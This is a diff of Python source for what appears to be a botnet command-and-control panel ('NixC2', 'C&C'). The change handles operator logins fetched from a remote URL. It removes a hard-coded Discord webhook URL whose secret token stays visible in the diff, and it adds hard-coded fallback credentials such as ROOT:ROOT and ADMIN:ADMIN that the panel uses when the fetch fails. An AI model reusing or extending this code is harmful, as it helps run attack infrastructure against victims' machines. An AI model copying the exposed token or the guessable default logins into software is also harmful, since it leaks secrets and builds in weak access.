@@ -5,7 +5,7 @@ from discord_webhook import DiscordWebhook
 from random import choice,choices,randint
 from colorama import Fore, init, Back
 
-OTP_WEB = "https://discord.com/api/webhooks/1077043960343691284/QrsDFlLvGoAphGA5jYouhx9ep7OGnuvD-HLOTKILvwhpRBmxbZI7wH4nkFMQLm59L6HT"
+OTP_WEB = ""
 data = ""
 otp_code = ''
 num = 0
@@ -318,6 +318,7 @@ def find_login(client,username, password,username_sql):
     global count_get_mysql_user_pass
     data_loader_file_user = ""
     username_sql = username_sql
+    rps = 0
     while True:
         try:
             if username_sql == "NixC2":
@@ -333,7 +334,7 @@ def find_login(client,username, password,username_sql):
                     if not URL_USER_WEB_SQL:
                         continue
                     break
-            req = requests.get(url=URL_USER_WEB_SQL)
+            req = requests.get(url=URL_USER_WEB_SQL).content
             print("OK . . .")
             data_loader_file_user = "OK"
         except:
@@ -341,15 +342,17 @@ def find_login(client,username, password,username_sql):
             data_loader_file_user = "NO"
             count_get_mysql_user_pass += 1
         finally:
-            if data_loader_file_user == "OK" or data_loader_file_user in "OK":
+            if data_loader_file_user == "OK" or data_loader_file_user in "OK" or rps > 10:
+                req = b'ROOT:ROOT\nADMIN:ADMIN\nGUEST:GUEST\nIDK:IDK'
                 break
             else:
                 color_random = color()
                 send(client, f'''{color_random}WAITING TO GET MYSQL . . .''')
                 send(client, f"\33]0;C&C CAN'T GET MYSQL {count_get_mysql_user_pass}\a", False)
                 print("TRYING . . .")
+                rps += 1
     file = open('logins.txt',"wb")
-    file.write(req.content)
+    file.write(req)
     file.close()
     loadering(client)
     credentials = [x.strip() for x in open('logins.txt').readlines() if x.strip()]
